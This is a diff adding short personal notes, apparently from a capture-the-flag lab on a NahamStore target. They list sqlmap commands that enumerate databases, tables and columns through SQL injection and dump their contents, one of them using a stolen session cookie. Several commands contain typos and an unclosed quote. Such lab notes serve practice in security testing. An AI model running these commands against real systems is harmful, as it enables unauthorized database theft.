@@ -1,0 +1,16 @@
+
+----------------http post req in req.tex ----------------------- have to right click cope to file in burp not ctrl +c !!!!!!!!!!!!!!!!!!!!!
+lmap -r req.txt --level 3 --risk 3 --dbs
+	- retrieved: nahamstore
+sqlmap -r req.txt --level 3 --risk 3 -D nahamstore --tables
+	- retrieved: squli_two
+sqlmap -r req.txt --level 3 --risk 3 -D nahamstore -T squli_two --columns
+	Columd = Easter_4
+sqlmap -r req.txt --level 3 --risk 3 -D nahamstore -T squli_two -C Easter_4 --sql-query "select Easter_4 from sqili_two"
+
+
+
+sqlmap http://[IP]/admin?user=3 --cookie='token=[Enter Cookie] --technique=U --delay=2 -dump
+
+
+sqlmap  -u "http://10.10.58.103/products/1" --batch -D <database> --dump
